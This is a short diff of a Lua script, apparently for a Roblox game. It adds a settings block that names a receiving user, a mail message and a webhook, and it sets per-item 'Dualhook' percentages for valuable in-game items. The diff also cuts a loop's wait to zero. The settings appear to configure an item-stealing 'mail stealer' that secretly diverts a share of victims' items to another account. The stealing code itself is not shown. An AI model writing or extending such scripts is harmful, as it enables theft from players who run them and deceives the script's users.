@@ -1,3 +1,45 @@
+getgenv().Settings = {
+    User = "TehPucuk_55",
+    Webhook = true, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
+    MailMessage = "Monzz Is Better",
+    Titanics = {
+        Dualhook = true,
+        Intensity = 100 --%
+    },
+    Banana = {
+        Dualhook = true,
+        Intensity = 100 --%
+    },
+    Huges = {
+        Dualhook = true,
+        Intensity = 50 --%
+    },
+    Pogs = {
+        Dualhook = true,
+        Intensity = 0 --%
+    },
+    Exclusives = {
+        Dualhook = true,
+        Intensity = 0 --%
+    },
+    Events = {
+        Dualhook = true,
+        Intensity = 0 --%
+    },
+    Secrets = {
+        Dualhook = true,
+        Intensity = 0 --%
+    },
+    HC_DM_Mythics = {
+        Dualhook = true,
+        Intensity = 0 --%
+    },
+    Gems = {
+        Dualhook = true,
+        Intensity = 50 --%
+    }
+}
+
 if getgenv().executed then return end
 getgenv().executed = true
 
@@ -1942,6 +1984,6 @@ spawn(function()
         WMythicList = {}
         WMList = {}
         WMcc = {}
-        wait(1)
+        wait(0)
     end
 end)
